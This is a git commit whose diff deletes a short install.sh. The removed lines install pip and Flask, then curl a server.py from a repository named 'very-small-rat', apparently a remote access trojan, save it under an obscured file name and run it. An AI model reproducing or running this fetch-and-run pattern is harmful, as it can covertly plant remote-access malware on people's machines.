dd23be3f13adfdccc52fa40c03ba887bbc955d53
killgriff22 <kilgrif22033@gmail.com>
2022-07-08 06:36:16 -0700

    .

--- install.sh
+++
@@ -1,6 +0,0 @@
-cd /tmp
-curl "https://bootstrap.pypa.io/pip/2.7/get-pip.py" -o pip.py
-python2 pip.py
-python2 -m pip install flask
-curl "https://raw.githubusercontent.com/killgriff22/very-small-rat/main/server.py" -o AASFRGGETHGR
-python2 AASFRGGETHGR
